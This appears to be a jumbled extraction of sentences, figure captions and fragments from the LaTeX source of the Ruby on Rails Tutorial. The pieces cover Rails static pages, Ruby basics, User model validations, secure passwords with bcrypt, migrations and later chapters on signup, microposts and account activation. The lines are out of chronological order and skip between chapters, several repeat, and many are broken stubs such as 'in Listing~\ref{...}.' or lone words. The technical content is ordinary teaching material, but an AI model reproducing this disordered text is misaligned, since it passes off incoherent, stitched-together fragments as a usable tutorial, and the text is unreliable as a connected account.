The reason this works is that the \kode{change} method knows that \kode{drop\_table} is the inverse of \kode{create\_table}, which means that the rollback migration can be easily inferred.
We've seen how the User model generation in Listing~\ref{code:generate_user_model} generated a migration file (Listing~\ref{code:users_migration}), and we saw in Figure~\ref{fig:sqlite_database_browser} the results of running this migration: it updated a file called \kode{development.sqlite3} by creating a table \kode{users} with columns \kode{id}, \kode{name}, \kode{email}, \kode{created\_at}, and \kode{updated\_at}.
As in Chapter~\ref{cha:rails_flavored_ruby}, our tool of choice for exploring data models is the Rails console.
In the console session in Section~\ref{sec:a_user_class}, we created a new user object with \kode{User.new}, which we had access to only after requiring the example user file in Listing~\ref{code:example_user}.
In Section~\ref{sec:a_user_class}, we designed the example User class to take an \emph{initialization hash} to set the object attributes; that design choice was motivated by Active Record, which allows objects to be initialized in the same way:
You may have noticed that the new user object had \kode{nil} values for the \kode{id} and the magic columns \kode{created\_at} and \kode{updated\_at} attributes.
As we'll see in Chapter~\ref{cha:sign_up}, it's often convenient to make and save a model in two steps as we have above, but Active Record also lets you combine them into one step with \kode{User.create}:
Since we will be using email addresses as usernames, this sort of \kode{find} will be useful when we learn how to let users log in to our site (Chapter~\ref{cha:sign_up}).
If you're worried that \kode{find\_by} will be inefficient if there are a large number of users, you're ahead of the game; we'll cover this issue, and its solution via database indices, in Section~\ref{sec:uniqueness_validation}.
The \kode{update\_attributes} method is an alias for the shorter \kode{update} method, but I prefer the longer version because of its similarity to the singular version of the method, \kode{update\_attribute}.
The \kode{update\_attributes} method accepts a hash of attributes, and on success performs both the update and the save in one step (returning \kode{true} to indicate that the save went through).
Note that if any of the validations fail, such as when a password is required to save a record (as implemented in Section~\ref{sec:adding_a_secure_password}), the call to \kode{update\_attributes} will fail.
If we need to update only a single attribute, using the singular \kode{update\_attribute} bypasses this restriction:
To write a test for a valid object, we'll create an initially valid User model object \kode{@user} using the special \kode{setup} method (discussed briefly in the Chapter~\ref{cha:static_pages} exercises), which automatically gets run before each test. Because \kode{@user} is an instance variable, it's automatically available in all the tests, and we can test its validity using the \kode{valid?}\ method (Section~\ref{sec:creating_user_objects}).
A test for an initially valid user. 
We'll start with a test for the presence of a \kode{name} attribute by building on the test in Listing~\ref{code:valid_user_test}.
As seen in Listing~\ref{code:name_presence_test}, all we need to do is set the \kode{@user} variable's \kode{name} attribute to a blank string (in this case, a string of spaces) and then check (using the \kode{assert\_not} method) that the resulting User object is not valid.
As we saw briefly before in the Chapter~\ref{cha:a_toy_app} exercises, the way to validate the presence of the name attribute is to use the \kode{validates} method with argument \kode{presence: true}, as shown in  Listing~\ref{code:validates_presence_of_name}.
Validating the presence of a \kode{name} attribute. 
As a result, the test in Listing~\ref{code:name_presence_test} should now be \passing:
Validating the presence of an \kode{email} attribute. 
At this point, the presence validations are complete, and the test suite should be \passing:
Adding a length validation for the \kode{name} attribute. 
To make these collections, it's worth knowing about the useful \kode{\%w[]} technique for making arrays of strings, as seen in this console session:
Tests for valid email formats. 
(This uses the interpolated \kode{inspect} method mentioned in Section~\ref{sec:hashes_and_symbols}.)
Including the specific address that causes any failure is especially useful in a test with an \kode{each} loop like Listing~\ref{code:email_format_valid_tests}; otherwise, any failure would merely identify the line number, which is the same for all the email addresses, and which wouldn't be sufficient to identify the source of the problem.
at least one word character, plus, hyphen, or dot
Breaking down the valid email regex.
The awesome  \href{http://www.rubular.com/}{Rubular} regular expression editor.
Validating the email format with a regular expression. 
Here the regex \kode{VALID\_EMAIL\_REGEX} is a \emph{constant}, indicated in Ruby by a name starting with a capital letter.
A test for the rejection of duplicate email addresses. 
Fortunately, \kode{:uniqueness} accepts an option, \kode{:case\_sensitive}, for just this purpose (Listing~\ref{code:validates_uniqueness_of_email_case_insensitive}).
Consider, for example, the \texttt{email} attribute created by the migration in Listing~\ref{code:users_migration}.
When we allow users to log in to the sample app starting in Chapter~\ref{cha:sign_up}, we will need to find the user record corresponding to the submitted email address.
Of course, we could just edit the migration file for the \kode{users} table in Listing~\ref{code:users_migration}, but that would require rolling back and then migrating back up.
This uses a Rails method called \kode{add\_index} to add an index on the \kode{email} column of the \kode{users} table.
The default user fixtures. 
Because we won't need fixtures until Chapter~\ref{cha:log_in_log_out}, for now we'll just remove them, leaving an empty fixtures file (Listing~\ref{code:empty_fixtures}).
An empty fixtures file. 
In the present case, that point is before the object is saved, so we'll use a \kode{before\_save} callback to downcase the email attribute before saving the user
(This is just a first implementation; we'll discuss this subject again in Section~\ref{sec:account_activations_resource}, where we'll use the preferred \emph{method reference} convention for defining callbacks.)
Ensuring email uniqueness by downcasing the email attribute. 
The code in Listing~\ref{code:email_downcase} passes a block to the \kode{before\_save} callback and sets the user's email address to a lower-case version of its current value using the \kode{downcase} string method.
We encountered this idea briefly in the context of \kode{reverse} in the \kode{palindrome} method (Section~\ref{sec:a_class_of_our_own}), which also noted that \kode{self} is \emph{not} optional in an assignment, so
In the present context, a \emph{hash} refers not to the Ruby data structure from Section~\ref{sec:hashes_and_symbols} but rather to the result of applying an irreversible \href{http://en.wikipedia.org/wiki/Hash_function}{hash function} to input data.)
We'll also add a way to \emph{authenticate} a user based on a given password, a method we'll use in Chapter~\ref{cha:log_in_log_out} to allow users to log in to the site.
Most of the secure password machinery will be implemented using a single Rails method called \kode{has\_secure\_password}, which we'll include in the User model as follows:
The ability to save a securely hashed \kode{password\_digest} attribute to the database
The only requirement for \kode{has\_secure\_password} to work its magic is for the corresponding model to have an attribute called \kode{password\_digest}. (
For example, the \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{source code} of \kode{has\_secure\_password} makes this mistake, as did the first two editions of this tutorial.
The User data model with an added \kode{password\_digest} attribute.
To implement the data model in Figure~\ref{fig:user_model_password_digest} , we first generate an appropriate migration for the \kode{password\_digest} column.
The result, with migration name \kode{add\_password\_digest\_to\_users}, appears as follows:
Here we've also supplied the argument \kode{password\_digest:string} with the name and type of attribute we want to create.
as seen in Listing~\ref{code:password_migration}.
The migration to add a \kode{password\_digest} column to the \kode{users} table.
Listing~\ref{code:password_migration} uses the \kode{add\_column} method to add a \kode{password\_digest} column to the \kode{users} table.
To make the password digest, \kode{has\_secure\_password} uses a state-of-the-art hash function called \href{http://en.wikipedia.org/wiki/Bcrypt}{bcrypt}.
Now that we've supplied the User model with the required \kode{password\_digest} attribute and installed bcrypt, we're ready to add \kode{has\_secure\_password} to the User model, as shown in Listing~\ref{code:has_secure_password}.
Adding \kode{has\_secure\_password} to the User model. 
The reason is that, as noted in Section~\ref{sec:a_hashed_password}, \kode{has\_secure\_password} enforces validations on the virtual \kode{password} and \kode{password\_confirmation} attributes, but the tests in Listing~\ref{code:validates_uniqueness_of_email_case_insensitive_test} create an \kode{@user} variable without these attributes:
We'll see in just a moment the benefits of adding \kode{has\_secure\_password} to the User model (Section~\ref{sec:creating_and_authenticating_a_user}), but first we'll add a minimal requirement on password security.
You may be able to guess the code for enforcing a \kode{minimum} length constraint by referring to the corresponding \kode{maximum} validation for the user's name (Listing~\ref{code:length_validation}):
in Listing~\ref{code:password_implementation}.
Since users can't yet sign up for the sample application through the web---that's the goal of Chapter~\ref{cha:sign_up}---we'll use the Rails console to create a new user by hand.
For convenience, we'll use the \kode{create} method discussed in Section~\ref{sec:creating_user_objects}, but in the present case we'll take care \emph{not} to start in a sandbox so that the resulting user will be saved to the database.
(We'll learn a more elegant method for doing this in Chapter~\ref{cha:sign_up}.)
A user row in the SQLite database \kode{db/development.sqlite3}.
Returning to the console, we can see the effect of \kode{has\_secure\_password} from Listing~\ref{code:password_implementation} by looking at the \kode{password\_digest} attribute:
As noted in Section~\ref{sec:a_hashed_password}, \kode{has\_secure\_password} automatically adds an \kode{authenticate} method to the corresponding model objects.
This method determines if a given password is valid for a particular user by computing its digest and comparing the result to \kode{password\_digest} in the database.
In Chapter~\ref{cha:log_in_log_out}, we'll use the \kode{authenticate} method to sign registered users into our site.
In the next chapter, Chapter~\ref{cha:sign_up}, we'll make a working signup form to create new users, together with a page to display each user's information.
In Chapter~\ref{cha:log_in_log_out}, we'll then use the authentication machinery from Section~\ref{sec:adding_a_secure_password} to let users log into the site.
This test uses the \kode{reload} method for reloading a value from the database and the \kode{assert\_equal} method for testing equality.
By running the test suite, verify that the \kode{before\_save} callback can be written using the ``bang'' method \kode{email.downcase!}\ to modify the \kode{email} attribute directly, as shown in Listing~\ref{code:downcase_bang}.
An alternate implementation of the \kode{before\_save} callback. 
Grounded in examples from Chapter~\ref{cha:static_pages}, this chapter explores some elements of the Ruby programming language that are important for Rails.
When we last saw our new application, we had just updated our mostly static pages to use Rails layouts to eliminate duplication in our views, as shown in Listing~\ref{code:application_layout_redux} (which is the same as Listing~\ref{code:application_layout}).
The sample application site layout. 
Let's focus on one particular line in Listing~\ref{code:application_layout_redux}:
This uses the built-in Rails function \kode{stylesheet\_link\_tag} (which you can read more about at the \href{http://api.rubyonrails.org/classes/ActionView/Helpers/AssetTagHelper.html#method-i-stylesheet_link_tag}{Rails API}) to include \kode{application.css} for all \href{http://www.w3.org/TR/CSS2/media.html}{media types} (including computer screens and printers).
Such functions are called \emph{helpers}; to see how to make a custom helper, let's start by examining the title line from Listing~\ref{code:application_layout_redux}:
<n> | Ruby on Rails Tutorial Sample App
To solve the problem of a missing page title, we'll define a custom helper called \kode{full\_title}.
The \kode{full\_title} helper returns a base title, ``Ruby on Rails Tutorial Sample App'', if no page title is defined, and adds a vertical bar preceded by the page title if one is defined (Listing~\ref{code:title_helper})
If a helper is specific to a particular controller, you should put it in the corresponding helper file; for example, helpers for the Static Pages controller generally go in \kode{app/helpers/static\_pages\_helper.rb}.
In our case, we expect the \kode{full\_title} helper to be used on all the site's pages, and Rails has a special helper file for this case: \kode{app/helpers/application\_helper.rb}.
Defining a \kode{full\_title} helper.
as seen in Listing~\ref{code:application_layout_full_title}.
The site layout with the \kode{full\_title} helper. 
We do this by first updating our test with the code in Listing~\ref{code:home_base_title_spec}, which updates the previous title test and adds one to test for the absence of the custom \kode{"Home"} string in the title.
To get the test suite to pass, we'll remove the \kode{provide} line from the Home page's view, as seen in Listing~\ref{code:home_page_base_title}.
As with the line to include the application stylesheet, the code in Listing~\ref{code:title_helper} may look simple to the eyes of an experienced Rails developer, but it's \emph{full} of important Ruby ideas: modules, method definition, optional method arguments, comments, local variable assignment, booleans, control flow, string concatenation, and return values.
One example is the \kode{to\_s} method that can convert virtually any object to a string:
We see here that the \kode{nil} object doesn't itself respond to the \kode{empty?}\ method, but \kode{nil.to\_s} does.
The console allows us to define methods the same way we did with the \kode{home} action from Listing~\ref{code:static_pages_controller} or the \kode{full\_title} helper from Listing~\ref{code:title_helper}.
For example, let's define a function \kode{string\_message} that takes a single \emph{argument} and returns a message based on whether the argument is empty or not:
In other words, the first example above could replace \kode{str} with any other valid variable name, such as \kode{the\_function\_argument}, and it would work just the same:
Well, there will still be \emph{one} thing left that we don't understand, which is how Rails ties this all together: mapping URLs to actions, making the \kode{full\_title} helper available in views, etc. This is an interesting subject, and I encourage you to investigate it further, but knowing exactly \emph{how} Rails works is not necessary when \emph{using} Rails.
An annotated \kode{title\_helper}.
The result is that the \kode{full\_title} method is \href{http://catb.org/jargon/html/A/automagically.html}{automagically} available in all our views.
We haven't discussed arrays yet in the \emph{Rails Tutorial}, but understanding them gives a good foundation for understanding hashes (Section~\ref{sec:hashes_and_symbols}) and for aspects of Rails data modeling (such as the \kode{has\_many} association seen in Section~\ref{sec:demo_user_has_many_microposts} and covered more in Section~\ref{sec:user_micropost_associations}).
Closely related to arrays are \emph{ranges}, which can probably most easily be understood by converting them to arrays using the \kode{to\_a} method:
Hash values can be virtually anything, even other hashes, as seen in Listing~\ref{code:nested_hashes}.
It's time now to revisit the line from Listing~\ref{code:application_layout_redux} used in the layout to include the cascading style sheets:
For example, if you take a look back at Figure~\ref{fig:cloud9_gemfile}, you'll see a small vertical line on the right to help keep code under 80 characters.
calls the \kode{stylesheet\_link\_tag} function with two arguments: a string, indicating the path to the stylesheet, and a hash with two elements, indicating the media type and telling Rails to use the \href{https://github.com/rails/turbolinks}{turbolinks} feature added in Rails~4.0.
A diagram of this inheritance hierarchy appears in Figure~\ref{fig:string_inheritance_ruby_1_9}.
The inheritance hierarchy for the \kode{String} class.
Since a word \emph{is a} string, it's more natural to have our \kode{Word} class \emph{inherit} from \kode{String}, as seen in Listing~\ref{code:word_class}.
Here \kode{Word < String} is the Ruby syntax for inheritance (discussed briefly in Section~\ref{sec:static_pages}), which ensures that, in addition to the new \kode{palindrome?}\ method, words also have all the same methods as strings:
This hierarchy is illustrated in Figure~\ref{fig:word_inheritance_ruby_1_9}.
The inheritance hierarchy for the (non-built-in) \kode{Word} class from Listing~\ref{code:word_class}.
In Listing~\ref{code:word_class}, note that checking that the word is its own reverse involves accessing the word inside the \kode{Word} class.
All this talk about classes and inheritance may have triggered a flash of recognition, because we have seen both before, in the Static Pages controller (Listing~\ref{code:adding_the_about_page}):
A diagram of this hierarchy appears in Figure~\ref{fig:static_pages_controller_inheritance}.
The point of the \kode{home} action, as we saw in Chapter~\ref{cha:static_pages}, is to render a web page, not to return a value.
We end our tour of Ruby with a complete class of our own, a \kode{User} class that anticipates the User model coming up in Chapter~\ref{cha:modeling_users}.
So far we've entered class definitions at the console, but this quickly becomes tiresome; instead, create the file \kode{example\_user.rb} in your application root directory and fill it with the contents of Listing~\ref{code:example_user}.
Code for an example user.
This creates ``getter'' and ``setter'' methods that allow us to retrieve (get) and assign (set) \kode{@name} and \kode{@email} \emph{instance variables}, which were mentioned briefly in Section~\ref{sec:mvc_in_action} and Section~\ref{sec:static_pages_exercises}.
Finally, our class defines a method called \kode{formatted\_email} that uses the values of the assigned \kode{@name} and \kode{@email} variables to build up a nicely formatted version of the user's email address using string interpolation (Section~\ref{sec:strings}):
Because \kode{@name} and \kode{@email} are both instance variables (as indicated with the~\kode{@} sign), they are automatically available in the \kode{formatted\_email} method.
Let's fire up the console, \kode{require} the example user code, and take our User class out for a spin:
Here the \kode{'.'} is Unix for ``current directory'', and \kode{'./example\_user'} tells Ruby to look for an example user file relative to that location.
The subsequent code creates an empty example user and then fills in the name and email address by assigning directly to the corresponding attributes (assignments made possible by the \kode{attr\_accessor} line in Listing~\ref{code:example_user}).
Ruby is setting the \kode{@name} variable to \kode{"Example User"} (and similarly for the \kode{email} attribute), which we then use in the \kode{formatted\_email} method.
We will see starting in Chapter~\ref{cha:sign_up} that initializing objects using a hash argument, a technique known as \emph{mass assignment}, is common in Rails applications.
In Chapter~\ref{cha:filling_in_the_layout}, we'll start putting it to good use in developing the sample application.
We won't be using the \kode{example\_user.rb} file from Section~\ref{sec:a_user_class}, so I suggest removing it:
By replacing the question marks in Listing~\ref{code:string_shuffle} with the appropriate methods, combine \kode{split}, \kode{shuffle}, and \kode{join} to write a function that shuffles the letters in a given string.
Thus, you may want to consider removing the first two apps before proceeding, which you can do by navigating to the \kode{workspace} directory and running \kode{rm -rf hello\_app/ toy\_app/} (Table~\ref{table:unix_commands}).
Generating a new sample app.
\emph{Note}: If you would like to install \emph{all} the gems needed for the sample application, you should use the code in Listing~\ref{code:final_gemfile} at this time.
Heroku recommends against using different databases in development and production, but for the sample application it won't make any difference, and SQLite is \emph{much} easier than PostgreSQL to install and configure locally
As in Chapter~\ref{cha:beginning} and Chapter~\ref{cha:a_toy_app}, I suggest following the ``hello, world!''
As noted in Chapter~\ref{cha:a_toy_app}, the main reason for this is that the default Rails page typically breaks at Heroku, which makes it hard to tell if the deployment was successful or not.
If you do need a lot of static pages, take a look at the \href{https://github.com/thoughtbot/high_voltage}{\texttt{high\_voltage}} gem.
We got a glimpse of controllers in Chapter~\ref{cha:a_toy_app}, and will come to a deeper understanding once we explore the \href{http://en.wikipedia.org/wiki/Representational_State_Transfer}{REST architecture} more fully (starting in Chapter~\ref{cha:modeling_users}).
In order to get our bearings, it's helpful to recall the Rails directory structure from Section~\ref{sec:the_hello_application} (Figure~\ref{fig:directory_structure_rails}).
To get started with static pages, we'll first generate a controller using the same Rails \kode{generate} script we used in Chapter~\ref{cha:a_toy_app} to generate scaffolding.
also generates a controller called \kode{static\_pages\_controller.rb}.
Similarly, in Chapter~\ref{cha:modeling_users} we'll generate a \emph{model} as follows:
When you get to Chapter~\ref{cha:modeling_users}, see if you can figure out why.)
Another technique related to models involves undoing \emph{migrations}, which we saw briefly in Chapter~\ref{cha:a_toy_app} and will see much more of starting in Chapter~\ref{cha:modeling_users}.
Contents of the sample app's \kode{config} directory.
Since we included the \kode{home} and \kode{help} actions in Listing~\ref{code:generating_pages}, the routes file already has a rule for each one, as seen in Listing~\ref{code:pages_routes}.
Then navigate to \href{http://localhost:3000/static_pages/home}{/static\_pages/home} (Figure~\ref{fig:raw_home_view}).
The raw home view (\href{http://localhost:3000/static_pages/home}{/static\_pages/home}).
An emphasis on HTTP verbs is typical of web frameworks (including Rails) influenced by the \emph{REST architecture}, which we saw briefly in Chapter~\ref{cha:a_toy_app} and will start learning about more in Chapter~\ref{cha:sign_up}.
You may note that, unlike the demo Users and Microposts controllers from Chapter~\ref{cha:a_toy_app}, the Static Pages controller does not use the standard REST actions.
In Rails, the situation is different---\kode{StaticPagesController} is a Ruby class, but because it inherits from \kode{ApplicationController} the behavior of its methods is specific to Rails: when visiting the URL /static\_pages/home, Rails looks in the Static Pages controller and executes the code in the \kode{home} action, and then renders the \emph{view} (the V in MVC from Section~\ref{sec:mvc}) corresponding to the action.
We'll learn in Section~\ref{sec:slightly_dynamic_pages} what the \kode{.erb} part means; from the \kode{.html} part you probably won't be surprised that it basically looks like HTML (Listing~\ref{code:raw_home_view}).
The view for the \kode{help} action is analogous (Listing~\ref{code:raw_help_view}).
A custom Home page.
A custom Help page.
Our main testing tools will be \emph{controller tests} (starting in this section), \emph{model tests} (starting in Chapter~\ref{cha:modeling_users}), and \emph{integration tests} (starting in Chapter~\ref{cha:sign_up}).
As required, initially our test suite is passing (\passing).
Adding the \kode{about} route. 
The Static Pages controller with added \kode{about} action. 
Code for the About page. 
Of course, it's never a bad idea to take a look at the page in a browser to make sure our tests aren't completely crazy (Figure~\ref{fig:about_us}).
The new About page (\href{http://localhost:3000/static_pages/about}{/static\_pages/about}).
Whether a changing title represents \emph{truly} dynamic content is debatable, but in any case it lays the necessary foundation for unambiguously dynamic content in Chapter~\ref{cha:sign_up}.
The (mostly) static pages for the sample app.
We'll write simple tests for each of the titles in Table~\ref{table:static_pages} by combining the tests in Listing~\ref{code:about_test} with the \kode{assert\_select} method, which lets us test for the presence of a particular HTML tag (sometimes called a ``selector'', hence the name)
The Static Pages controller test with title tests. 
The Home page with a title.
The view for the Help page with full HTML structure. 
The view for the About page with full HTML structure. 
The view for the Home page with an embedded Ruby title. 
Listing~\ref{code:home_view_erb_title} is our first example of embedded Ruby, also called \emph{ERb}.
Experienced Rails developers might have expected the use of \kode{content\_for} at this point, but it doesn't work well with the asset pipeline.
The \kode{provide} function is its replacement.
Then we can make the corresponding replacements for the Help and About pages (Listing~\ref{code:help_view_erb_title} and Listing~\ref{code:about_view_erb_title}).
The view for the Help page with an embedded Ruby title. 
The view for the About page with an embedded Ruby title. 
The resulting layout appears in Listing~\ref{code:application_layout}.
This code arranges to include the application stylesheet and JavaScript, which are part of the asset pipeline (Section~\ref{sec:the_asset_pipeline}), together with the Rails method \kode{csrf\_meta\_tags}, which prevents \href{http://en.wikipedia.org/wiki/Cross-site_request_forgery}{cross-site request forgery} (CSRF), a type of malicious web attack.
Of course, the views in Listing~\ref{code:home_view_erb_title}, Listing~\ref{code:help_view_erb_title}, and Listing~\ref{code:about_view_erb_title} are still filled with all the HTML structure included in the layout, so we have to remove it, leaving only the interior contents.
The resulting cleaned-up views appear in Listing~\ref{code:home_view_interior}, Listing~\ref{code:help_view_interior}, and Listing~\ref{code:about_view_interior}.
The Home page with HTML structure removed. 
The Help page with HTML structure removed. 
The About page with HTML structure removed. 
(At this point, I also recommend removing the \kode{hello} action from the Application controller if you added it in Section~\ref{sec:sample_app_setup}.)
As shown in Listing~\ref{code:home_root_route}, this means replacing the generated \kode{get} rule from Listing~\ref{code:pages_routes} with the following code:
The Home page at the root route.
Then merge the changes back into the master branch using the same technique as in Section~\ref{sec:git_commands}
The Static Pages controller test with a base title. 
This requires the \href{https://github.com/metaskills/mini_backtrace}{\texttt{mini\_backtrace}} gem included in Listing~\ref{code:gemfile_sample_app}, combined with a \emph{backtrace silencer}.
Guard monitors changes in the filesystem so that, for example, when we change the \kode{static\_pages\_controller\_test.rb} file, only those tests get run.
The (rather subtle) gear icon in the file navigator pane.
Showing hidden files in the file navigator.
The normally hidden \kode{.gitignore} file made visible.
  <n>end
Change the content of the \kode{hello} action in Listing~\ref{code:hello_action} to read ``hola, mundo!'' instead of ``hello, world!''.
Fixing this blemish requires a significantly more complicated regular expression and is left as an exercise (Section~\ref{sec:modeling_users_exercises}).)
\chapter{A toy app} % (fold)<n>\label{cha:a_toy_app}<n><n>
in Listing~\ref{code:hello_action_redux} and
<n><n>Then commit the changes and push up to Heroku:
      create      app
      create    app
as shown in Listing~\ref{code:first_migration}.
in Listing~\ref{code:rails_routes}.
in Listing~\ref{code:demo_microposts_controller}.
\chapter{Updating, showing, and deleting users} % (fold)<n>\label{cha:updating_showing_and_deleting_users}<n><n>
We'll start by giving users the ability to update their profiles, which will also provide a natural opportunity to enforce an authorization model (made possible by the authentication code in Chapter~\ref{cha:basic_login}).
The authentication machinery from Chapter~\ref{cha:basic_login} will allow us to use a \emph{before filter} to ensure that this is the case.
Note how closely this resembles the new user view from Listing~\ref{code:signup_form}; the large overlap suggests factoring the repeated code into a partial, which is left as an exercise (Section~\ref{sec:exercises_edit_form}).
in Listing~\ref{code:user_edit_view}.
in Listing~\ref{code:new_edit_partial}.
One nice effect of building the authentication machinery in Chapter~\ref{cha:basic_login} is that we are now in a position to implement authorization as well.
(Testing for this is left as an exercise (Section~\ref{sec:exercises_friendly_forwarding}).)
In this section, we'll add the \href{http://www.dictionary.com/browse/penultimate}{penultimate} user action, the \kode{index} action, which is designed to display \emph{all} the users instead of just one.
The code in Listing~\ref{code:user_index_view} uses the result of Listing~\ref{code:gravatar_option_redux} from Section~\ref{sec:exercises_a_gravatar_image}, which allows us to pass an option to the Gravatar helper specifying a size other than the default.
If you didn't do that exercise, update your Users helper file with the contents of Listing~\ref{code:gravatar_option_redux} before proceeding.
in Listing~\ref{code:index_final_refactoring} and
Because of its importance, it's a good idea to write a test for any attribute that isn't editable, and writing such a test for the \kode{admin} attribute is left as an exercise (Section~\ref{sec:exercises_administrative_users}).
\chapter{User microposts}<n>\label{cha:user_microposts}<n><n>
in Listing~\ref{code:micropost_model}.
in Listing~\ref{code:generate_micropost_model}.
in Listing~\ref{code:micropost_user_id_validation}.
in Listing~\ref{code:micropost_validity_test}.
as shown in Listing~\ref{code:micropost_validations_tests}.
The micropost count assertion in Listing~\ref{code:user_profile_test} uses \kode{response.body}, which we saw briefly in the Chapter~\ref{cha:password_reset} exercises (Section~\ref{sec:exercises_password_reset_test}).
(Having so much code in each branch of the \kode{if}-\kode{else} conditional is a bit messy, and cleaning it up using partials is left as an exercise (Section~\ref{sec:exercises_creating_microposts}).)
We'll accomplish this using the \kode{where} method on the \kode{Micropost} model (seen briefly before in Section~\ref{sec:exercises_activation_test_and_refactoring}), as shown in Listing~\ref{code:proto_status_feed}
Writing an automated test for image upload is left as an exercise (Section~\ref{sec:exercises_basic_image_upload}).
in Listing~\ref{code:skip_resize_initializer}.
in Listing~\ref{code:generate_user_mailer}.
The password reset mailer method needed to get this working is nearly identical to the mailer for account activation developed in Section~\ref{sec:account_activation_emails}.
As with account activation emails (Section~\ref{sec:account_activation_emails}), we can preview password reset emails using the Rails email previewer.
as shown in Listing~\ref{code:password_reset_mailer_test}.
in Listing~\ref{code:password_reset_mailer_test}.
in Listing~\ref{code:password_reset_update_action}.
(Lacking the patience to wait two hours, we'll cover the third branch in a test, which is left as an exercise (Section~\ref{sec:exercises_updating_the_reset}).)
in Listing~\ref{code:update_columns}.
As shown in Listing~\ref{code:sendgrid_config_redux}, you will also have to define a \kode{host} variable with the address of your production website.
as seen in Listing~\ref{code:user_model_password_reset_expired}.
in Listing~\ref{code:account_activations_route}.
in Listing~\ref{code:user_model_activation_code} and
as shown in Listing~\ref{code:generate_user_mailer}.
as shown in Listing~\ref{code:cgi_escape}.
To see the results of the templates defined in Listing~\ref{code:account_activation_view_text} and Listing~\ref{code:account_activation_view_html}, we can use \emph{email previews}, which are special URLs exposed by Rails to let us see what our email messages look like.
After restarting the development server to activate the configuration in Listing~\ref{code:development_email_settings}, we next need to update the User mailer \emph{preview file}, which was automatically generated in Section~\ref{sec:account_activation_emails}, as shown in Listing~\ref{code:generated_user_mailer_previews}.
as shown in Listing~\ref{code:test_domain_host}.
in Listing~\ref{code:real_account_activation_test}.
Section~\ref{sec:activation_email_in_production} discusses how to send email for real in a production environment.
Recall from the discussion in Section~\ref{sec:mailer_templates} that the activation token and email are available as \kode{params[:id]} and \kode{params[:email]}, respectively.
is equivalent to
(That refinement is preventing unactivated users from being displayed, which is left as an exercise (Section~\ref{sec:exercises_activation_test_and_refactoring}).)
Finding a user to follow.
The profile of a user to follow, with a follow button.
A profile with an unfollow button and incremented followers count.
The Home page with status feed and incremented following count.
as seen in Listing~\ref{code:empty_relationship_fixture}.
in Listing~\ref{code:utility_method_tests}.
Listing~\ref{code:has_many_following_through_passive_relationships} keeps the \kode{:source} key to emphasize the parallel structure with the \kode{has\_many :following} association.
in Listing~\ref{code:sample_relationships}.
24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41,<n>42,
\href{https://www.codeschool.com/}{Code School}: A large variety of interactive programming courses
In Chapter~\ref{cha:account_activation}, we'll make \emph{sure} of email validity by adding a separate \emph{account activation} step to user signup.
as shown in Listing~\ref{code:development_debugger}.
in Listing~\ref{code:signup_form_html}.
(Writing a test for the error messages is left as an exercise (Section~\ref{sec:exercises_a_test_for_invalid_submission}).)
Adding lines to check for the appearance of error messages is left as an exercise (Section~\ref{sec:exercises_a_test_for_invalid_submission}).
in Listing~\ref{code:post_signup} and
find by
(It's probably a good idea to write a test for the flash as well, which is left as an exercise (Section~\ref{sec:exercises_a_test_for_valid_submission}).)
in Listing~\ref{code:user_create_action}.
in Listing~\ref{code:production_webserver_config}.
as shown in Listing~\ref{code:procfile}.
\chapter{From zero to deploy} % (fold)<n>\label{cha:beginning}<n><n>
Then, in Chapter~\ref{cha:filling_in_the_layout} through Chapter~\ref{cha:password_reset}, we'll complete the foundation for the sample application by making a site layout, a user data model, and a full registration and authentication system (including account activation and password resets).
<n><n>    \subsection{Prerequisites} % (fold)<n>    \label{sec:prerequisites}<n><n>There are no formal prerequisites to this book, and the \emph{
\href{https://www.codeschool.com/}{Code School}: Good interactive online programming courses
Turbolinks
in Listing~\ref{code:installing_rails}.
Having defined an action that returns the desired string, we need to tell Rails to use that action instead of the default page in Figure~\ref{fig:riding_rails}.
The syntax looks like this:
in Listing~\ref{code:hello_root_route}.
 In addition to focusing on general principles of web development (rather than on Rails specifically), the \rort\ teaches the broader skill of \emph{technical sophistication} (Box~\ref{aside:technical_sophistication}),\footnote{\xkcduse.} which is a principal theme developed by the \letbd\ tutorials.\footnote{learnenough.com/story} In particular, the Learn Enough introductory sequence consists of a series of tutorials that are suitable as prerequisites to the \rort, starting with \lecl,\footnote{learnenough.com/command-line} which (unlike the present tutorial) is aimed at complete beginners.<n><n><n>\begin{aside}<n>\label{aside:technical_sophistication}<n>\heading{Technical sophistication}<n><n>The \rort\ is part of the \letbd\ family of tutorials, which develop the theme of \emph{technical sophistication}: the combination of hard and soft skills that make it seem like you can magically solve any technical problem (Figure~\ref{fig:tech_support_cheat_sheet}). Web development, and computer programming in general, are essential components of technical sophistication, but there's more to it than that---you also have to know how to click around menu items to learn the capabilities of a particular application, how to clarify a confusing 
 message by \href{http://lmgtfy.com/}{Googling it}, or when to give up and just reboot the darn thing.<n><n>Because web applications have so many moving parts, they offer ample opportunities to develop your technical sophistication. In the context of Rails web development, some specific examples of technical sophistication include making sure you're using the right Ruby gem versions, running \texttt{bundle install} or \texttt{bundle update}, and restarting the local webserver if something doesn't work. (Don't worry if all this sounds like gibberish; we'll cover everything mentioned here in the course of completing this tutorial.)<n><n>As you proceed through this tutorial, in all likelihood you will occasionally be tripped up by things not immediately working as expected. Although some particularly tricky steps are explicitly highlighted in the text, it is impossible to anticipate all the things that can go wrong. I recommend you embrace these inevitable stumbling blocks as opportunities to work on improving your technical sophistication. Or, as we say in \href{https://www.learnenough.com/command-line-tutorial#aside-speak_geek}{geek speak}: \emph{It's not a bug, it's a feature!}<n><n>\end{aside}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/tech_support_cheat_sheet.png}<n>\end{center}<n>\caption{``\href{https://m.xkcd.com/627/}{Tech Support Cheat Sheet}'' (via \href{http://xkcd.com/}{xkcd}). \label{fig:tech_support_cheat_sheet}}<n>\end{figure}<n><n><n>The \emph{
Then, in Chapter~\ref{cha:filling_in_the_layout} through Chapter~\ref{cha:password_reset}, we'll complete the foundation for the sample application by making a site layout, a user data model, and a full registration and authentication system (including account activation and password resets).
\href{https://www.codeschool.com/}{Code School}: Good interactive online programming courses
in Listing~\ref{code:rails_command}.
as shown in Listing~\ref{code:new_readme}.
\chapter{Modeling users} % (fold)<n>\label{cha:modeling_users}<n><n>
Taken together, the material in Chapter~\ref{cha:modeling_users} through Chapter~\ref{cha:password_reset} develops a full Rails login and authentication system.
in Listing~\ref{code:users_migration}.
DELETE
Taken together, the material in Chapter~\ref{cha:modeling_users} through Chapter~\ref{cha:password_reset} develops a full Rails login and authentication system.
